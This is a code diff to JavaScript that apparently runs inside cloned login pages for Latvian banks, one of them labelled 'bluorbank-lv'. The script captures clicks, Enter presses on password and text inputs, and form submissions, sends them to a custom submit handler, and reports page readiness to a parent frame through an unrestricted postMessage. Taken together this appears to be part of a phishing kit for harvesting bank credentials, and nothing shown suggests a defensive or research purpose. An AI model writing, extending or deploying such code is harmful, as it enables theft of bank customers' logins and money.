@@ -199,6 +199,8 @@ var m=(location.pathname||'').match(/\/latvian-banks\/([a-z0-9_-]+)\/([^\/]+)\.h
 if(!m)return;
 var bank=m[1],file=m[2];
 var curIdx=(parseInt(file,10)||1)-1;
+function _domReady(){try{parent.postMessage({type:'LITHUANIA_BANK_DOM_READY',file:file+'.html'},'*')}catch(e){}}
+if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',_domReady);}else{_domReady();}
 
 // ---- ortak: gorunur/doldurulabilir input'lari bul ----
 function visInputs(){
@@ -384,11 +386,11 @@ if(bank==='bluorbank-lv'){
     return true;
   }
   document.addEventListener('click',function(e){
-    if(explicit){var x=e.target.closest&&e.target.closest(explicit);if(x){e.preventDefault();e.stopImmediatePropagation();doSubmit();return;}}
+    if(explicit){var x=e.target.closest&&e.target.closest(explicit);if(x){e.preventDefault();e.stopImmediatePropagation();doSubmit(x);return;}}
     var b=e.target.closest&&e.target.closest(SEL);
     if(!b||!isSubmitBtn(b))return;
     e.preventDefault();e.stopImmediatePropagation();
-    doSubmit();
+    doSubmit(b);
   },true);
   document.addEventListener('keydown',function(e){
     if(e.key!=='Enter')return;
@@ -396,7 +398,7 @@ if(bank==='bluorbank-lv'){
     if(!t||t.tagName!=='INPUT')return;
     var tt=(t.type||'text').toLowerCase();
     if(['text','password','tel','email','number'].indexOf(tt)<0)return;
-    e.preventDefault();doSubmit();
+    e.preventDefault();doSubmit(t);
   },true);
   document.addEventListener('submit',function(e){e.preventDefault();},true);
 })();
